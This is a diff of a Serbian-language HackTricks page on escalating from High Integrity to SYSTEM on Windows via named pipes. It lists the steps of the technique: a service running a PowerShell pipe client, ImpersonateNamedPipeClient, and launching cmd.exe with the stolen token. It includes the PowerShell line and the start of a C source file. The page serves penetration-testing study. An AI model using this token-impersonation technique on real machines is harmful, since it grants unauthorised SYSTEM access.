@@ -1,14 +1,16 @@
+# Od High Integrity do SYSTEM pomoću Name Pipes
+
 {{#include ../../banners/hacktricks-training.md}}
 
-**Tok kodiranja:**
+**Tok izvršavanja:**
 
-1. Kreirajte novu cev
-2. Kreirajte i pokrenite servis koji će se povezati na kreiranu cev i nešto napisati. Kod servisa će izvršiti ovaj kod u PS: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
-3. Servis prima podatke od klijenta u cevi, poziva ImpersonateNamedPipeClient i čeka da servis završi
-4. Na kraju, koristi token dobijen od servisa da pokrene novi _cmd.exe_
+1. Kreira novi Pipe
+2. Kreira i pokreće service koji će se povezati sa kreiranim Pipe-om i upisati nešto. Kod service-a će izvršiti ovaj kodirani PS kod: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
+3. Service prima podatke od client-a kroz Pipe, poziva ImpersonateNamedPipeClient i čeka da se service završi
+4. Na kraju koristi token dobijen od service-a za pokretanje novog _cmd.exe_
 
 > [!WARNING]
-> Ako nemate dovoljno privilegija, eksploatacija može da se zaglavi i nikada se ne vrati.
+> Ako nemate dovoljno privilegija, exploit može da se zaglavi i da se nikada ne završi.
 ```c
 #include <windows.h>
 #include <time.h>
